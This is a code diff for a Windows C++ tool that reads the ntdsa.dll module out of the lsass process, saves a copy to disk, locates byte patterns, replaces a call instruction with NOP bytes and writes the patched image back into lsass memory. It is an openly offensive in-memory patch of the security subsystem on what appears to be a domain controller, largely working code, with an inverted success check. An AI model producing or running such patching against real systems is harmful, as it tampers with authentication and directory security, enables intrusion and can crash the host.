@@ -2,6 +2,7 @@
 //
 
 #include "stdafx.h"
+#include "Operators.h"
 
 #include <windows.h>
 #include <psapi.h>
@@ -13,8 +14,7 @@
 #include <io.h>
 #include <tchar.h>
 
-#define EXIT_POINT { 0x49, 0x8b, 0xe3, 0x5f, 0xc3 }
-#define OMFC {}
+bool find_pattern(const byte pattern[], size_t size_of_pattern, byte *buf, size_t size_of_buf, int start, int *offset);
 
 using namespace std;
 
@@ -109,7 +109,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 		return 0;
 	}
 
-	void* buf = malloc(size_of_ntdsa);
+	byte *buf = (byte *)malloc(size_of_ntdsa);
 	if (!buf) {
 		cout << "Failed to allocate space for memory contents: " << GetLastError() << endl;
 		CloseHandle(h_lsass);
@@ -133,6 +133,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 		}
 	}
 
+	// Write DLL to disk for static ref
 	if (num_bytes_read > 0) {
 		FILE *fp;
 		fopen_s(&fp, "C:\\ntdsa_new.dll", "w");
@@ -144,15 +145,47 @@ int _tmain(int argc, _TCHAR* argv[]) {
 		cout << "Wrote " << bytes_written << " bytes." << endl;
 	}
 
+
+	int offset_of_function = 0;
+	if (find_pattern(start_pattern_3, sizeof(start_pattern_3), buf, size_of_ntdsa, 0, &offset_of_function)) {
+		int offset_of_exit = 0;
+		if (find_pattern(end_pattern_3, sizeof(end_pattern_3), buf, size_of_ntdsa, offset_of_function, &offset_of_exit)){
+			int size_of_function = offset_of_exit - offset_of_function;
+			int call_offset = 0;
+			if (find_pattern(call_addr, sizeof(call_addr), buf, size_of_ntdsa, offset_of_function, &call_offset)) {
+				byte nop_array[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
+				memcpy(buf + call_offset, nop_array, sizeof(nop_array));
+
+				SIZE_T mem_bytes_written = 0;
+				if (WriteProcessMemory(h_lsass, start_addr, buf, size_of_ntdsa, &mem_bytes_written) != 0)
+					cout << "Failed to write to memory: " << GetLastError() << endl;
+				else
+					cout << "Wrote " << mem_bytes_written << " bytes... prepare for blue screen." << endl;
+			}
+		}
+	}
+
 	CloseHandle(h_lsass);
 	free(buf);
 
 	return 0;
 }
 
-BYTE* get_pattern(string name) {
-	if (name.compare("EXIT_POINT_1")) {
-		BYTE *pattern = (BYTE *)malloc(5);
-		return pattern;
+// Search 'buf' for 'pattern' at 'start'.  If found, sets 'offset', and returns true.
+bool find_pattern(const byte pattern[], size_t size_of_pattern, byte *buf, size_t size_of_buf, int start, int *offset) {
+
+	for (unsigned int i = start; i < size_of_buf; i++) {
+		if (buf[i] == pattern[0]) {
+			for (int j = 1; j < size_of_pattern; j++) {
+				if (buf[i + j] != pattern[j])
+					break;
+				if (j < size_of_pattern - 1)
+					continue;
+
+				*offset = i;
+				return true;
+			}
+		}
 	}
+	return false;
 }
